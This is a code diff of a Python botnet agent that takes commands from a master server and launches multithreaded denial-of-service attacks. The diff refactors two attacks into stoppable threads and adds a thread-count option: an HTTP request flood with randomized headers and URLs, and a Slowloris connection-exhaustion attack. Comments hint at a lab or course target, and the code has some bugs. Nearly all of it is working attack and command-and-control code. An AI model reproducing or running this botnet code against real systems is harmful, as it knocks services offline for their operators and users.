@@ -17,9 +17,10 @@ ENCODING = 'utf-8'
 
 class Bot():
 
-	def __init__(self, server: str, port: int):
+	def __init__(self, server: str, port: int, threads: int):
 		self.master_server = server
 		self.master_port = port
+		self.threads = threads
 		self.sock: socket.socket = None
 		self.master_socket: socket.socket = None
 		self.authenticated = False
@@ -27,6 +28,7 @@ class Bot():
 		self.target_address: str = ''
 		self.attack_type: int = 0
 		self.attacking: bool = False
+		self.active_threads: list[Thread] = []
 
 		
 	def start(self):
@@ -60,7 +62,7 @@ class Bot():
 	def _request_router(self, sock: socket.socket):                        
 		sock_addr = sock.getpeername()
 		recv_data = sock.recv(RECV_BUFFER).decode(ENCODING)
-		print(f'received request from ${sock_addr}')
+		print(f'received request from {sock_addr}')
 		try:
 			if recv_data:
 				try:
@@ -68,34 +70,42 @@ class Bot():
 					if request[0] == 'whoami':
 						self.master_socket = sock   
 						self.sock.send("iam:bot".encode(ENCODING))
+						print(f'whoami request received')
 					elif request[0] == 'iam':
 						if request[1] == 'error':                           
-							print("iam command error:", request[2])
+							print(f"iam command error:{request[2]}")
 						elif request[1] == 'success': 
 							self.authenticated = True
+							print(f'authenticated as bot')
 					elif request[0] == 'changeip':                              #did they decide to include port?
 						self.target_address = request[1]
+						print(f'new target received {self.target_address}')
 					elif request[0] == 'changeattk':
 						self.attack_type = int(request[1])
+						print(f'attack type changed to {self.attack_type}')
 					elif request[0] == 'startattk':          
 						self.attacking = True
+						print(f"starting attack {self.attack_type} on target {self.target_address}")
 						if self.attack_type == 1:
-							for _ in range(100):										#creates 100 threads that run a while True loop, but Bot can keep recv-ing
-								t = threading.Thread(target=self.attack1)	
-								t.start()
-
+							for _ in range(self.threads):										#creates 100 threads that run a while True loop, but Bot can keep recv-ing
+								t = RequestAttack(self.target_address)
+								t.start() #t.join
+								self.active_threads.append(t)
 						if self.attack_type == 2:
-							for _ in range(100):										#creates 100 threads that run a while True loop, but Bot can keep recv-ing
-								t = threading.Thread(target=self.attack2)	
-								t.start()
+							for _ in range(self.threads):										#creates 100 threads that run a while True loop, but Bot can keep recv-ing
+								t = SlowLorisAttack(self.target_address)	
+								t.start() #t.join?
+								self.active_threads.append(t)
+						print(f"attack {self.attack_type} running")
 					elif request[0] == 'stopattk':
 						self.attacking = False
+						print('stopping attack')
+						for t in self.active_threads:
+							t.stop()
+						print("attack stopped")
 					else:
-						print(
-							f'Cannot handle request from {sock_addr}\nrequest:{recv_data}'
-						)
-						response = f'{request[0]}:error:cannot handle request'.encode(
-							ENCODING)
+						print(f'Cannot handle request from {sock_addr}\nrequest:{recv_data}')
+						response = f'{request[0]}:error:cannot handle request'.encode(ENCODING)
 						sock.send(response)
 				except ValueError:
 					print(f'cannot parse request!')
@@ -118,24 +128,15 @@ class Bot():
 		self.sock.close()
 		sys.exit()
 
-	def attack1(self):
-		attack = RequestAttack('68.146.50.254')       
-		while self.attacking == True:							
-			attack.run()
-		
-	def attack2(self):
-		attack2 = SlowLorisAttack('68.146.50.254', 9999) 
-		while self.attacking == True:
-			attack2.run()
-
-
-
 ''' Original code from: Author: ___T7hM1___ Github: http://github.com/t7hm1/pyddos   '''
 
-class RequestAttack():
+class RequestAttack(threading.Thread):
 	
-	def __init__(self, target: str):         
+	def __init__(self, target: str) -> None:   
+		super().__init__()    
 		self.target = target
+		self.port = 9999
+		self.stopper = threading.Event()
 	
 	def header(self):                                   
 		cachetype = ['no-cache','no-store','max-age='+str(randint(0,10)),'max-stale='+str(randint(0,100)),'min-fresh='+str(randint(0,10)),'notransform','only-if-cache']
@@ -183,111 +184,109 @@ class RequestAttack():
 	def create_url(self):								### creates random url by adding '?' + randomstring
 		return self.target + '?' + self.rand_str()
 
-	def run(self):                                                          
-		try:	
-			connection = http.client.HTTPConnection(self.target, port = 9999, timeout = 1)		### hardcoded port for our target server
-			url = self.create_url()
-			http_header = self.header()
-			method = choice(['GET','POST'])
-			connection.request(method, url, None, http_header)
-			connection.close()
-		except socket.timeout:
-			connection.close()
-		except KeyboardInterrupt:
-			sys.exit(print('Canceled by user'))
-		except Exception as e:
-			print(e)
-			sys.exit()
+	def stop(self):
+		self.stopper.set()
+
+	def stopped(self):
+		return self.stopper.is_set()
+	
+	def run(self):     
+		while True:                                                     
+			try:	
+				connection = http.client.HTTPConnection(self.target, self.port, timeout = 1)		### hardcoded port for our target server
+				url = self.create_url()
+				http_header = self.header()
+				method = choice(['GET','POST'])
+				connection.request(method, url, None, http_header)
+				connection.close()
+			except socket.timeout:
+				connection.close()
+			except KeyboardInterrupt:
+				sys.exit(print('Canceled by user'))
+			except Exception as e:
+				print(e)
+				sys.exit()
+			if self.stopped() == True:
+				sys.exit()
 	  
 ''' End of referenced code '''
 
 
 ''' Original code from: Author: 0xc0d Github: https://github.com/0xc0d/Slow-Loris/blob/master/SlowLoris.py '''
-#regular_headers = [ "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
-     #               "Accept-language: en-US,en,q=0.5"]
-class SlowLorisAttack():
-   # regular_headers = [ "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
-    #                "Accept-language: en-US,en,q=0.5"]
 
-    def __init__(self, target: str, port: int):
-        self.target = target
-        self.port = port
-        self.regualr_headers = [ "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
-                    "Accept-language: en-US,en,q=0.5"]
+class SlowLorisAttack(threading.Thread):
+
+	def __init__(self, target: str) -> None:
+		super().__init__()
+		self.target = target
+		self.port = 9999
+		self.regualr_headers = [ "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
+					"Accept-language: en-US,en,q=0.5"]
+		self.socket_count = 100 #can adjust
+		self.stopper = threading.Event()
 
 
-    def init_socket(self):
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(4)
-        sock.connect((self.target,self.port))
-        sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode('UTF-8'))
+	def init_socket(self):
+		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		sock.settimeout(4)
+		sock.connect((self.target,self.port))
+		sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode('UTF-8'))
 
-        for header in regular_headers:
-            sock.send('{}\r\n'.format(header).encode('UTF-8'))
+		for header in regular_headers:
+			sock.send('{}\r\n'.format(header).encode('UTF-8'))
 
-        return sock
+		return sock
 
-    def run(self):
-        #if len(sys.argv)<5:
-         #   print(("Usage: {} example.com 80 100 10".format(sys.argv[0])))
-          #  return
+	def stop(self):
+		self.stopper.set()
 
-        #ip = sys.argv[1]
-        #port = sys.argv[2]
-        socket_count= 100   # can adjust
-        #bar = Bar('\033[1;32;40m Creating Sockets...', max=socket_count)
-        timer = 10          # can adjust
-        socket_list=[]
+	def stopped(self):
+		return self.stopper.is_set()
 
-        for _ in range(int(socket_count)):
-            try:
-                sock = init_socket(self)
-            except socket.error:
-                break
-            socket_list.append(sock)
-            #next(bar)
+	def run(self):
+		timer = 10          # can adjust
+		socket_list=[]
 
-        #bar.finish()
+		for _ in range(self.socket_count):
+			try:
+				sock = self.init_socket(self)
+			except socket.error:
+				break
+			socket_list.append(sock)
 
-        while True:
-                try:
-                        print(("\033[0;37;40m Sending Keep-Alive Headers to {}".format(len(socket_list))))
+		while True:
+				try:
+					print(f"Sending {len(socket_list)} Keep-Alive Headers")
+					for s in socket_list:
+						try:
+							s.send("X-a {}\r\n".format(random.randint(1,5000)).encode('UTF-8'))
+						except socket.error:
+							socket_list.remove(s)
+					n = self.socket_count - len(socket_list)
+					for _ in range(n):
+						print(f"Re-creating {n} Sockets...")
+						try:
+							s = self.init_socket(self)
+							if s:
+								socket_list.append(s)
+						except socket.error:
+							break
+					time.sleep(timer)
+				except KeyboardInterrupt:
+						sys.exit(print('Canceled by user'))
+				except Exception as e:
+						print(e)
+						sys.exit()
+				if self.stopped() == True:
+					sys.exit()
 
-                        for s in socket_list:
-                            try:
-                                s.send("X-a {}\r\n".format(random.randint(1,5000)).encode('UTF-8'))
-                            except socket.error:
-                                socket_list.remove(s)
-
-                        for _ in range(socket_count - len(socket_list)):
-                            print(("\033[1;34;40m {}Re-creating Socket...".format("\n")))
-                            try:
-                                s = init_socket(ip,port)
-                                if s:
-                                    socket_list.append(s)
-                            except socket.error:
-                                break
-
-                        time.sleep(timer)
-                except socket.timeout:
-                        socket.close()
-                except KeyboardInterrupt:
-                        sys.exit(print('Canceled by user'))
-                except Exception as e:
-                        print(e)
-                        sys.exit()
-                
-
-    #if __name__=="__main__":
-     #   main()
-    ''' End of referenced code'''
+''' End of referenced code '''
 
 if __name__ == "__main__":
 	parser = argparse.ArgumentParser(description = 'Bot Agent')
-	parser.add_argument('-a', metavar='HOST_ADDRESS', type=str,
-						default='', help='Interface the server listens at')
-	parser.add_argument('-p', metavar='PORT', type=int, default=8080,
-						help='TCP port (default 8080)')
+	parser.add_argument('-a', metavar='HOST_ADDRESS', type=str, default='', help='Interface the server listens at')
+	parser.add_argument('-p', metavar='PORT', type=int, default=8080, help='TCP port (default 8080)')
+	parser.add_argument('-t',  metavar='THREADS', type=int, default=1, help='Number of threads to spawn (default 1)')
 	args = parser.parse_args()
-	bot = Bot(args.a, args.p)
+	bot = Bot(args.a, args.p, args.t)
 	bot.start()
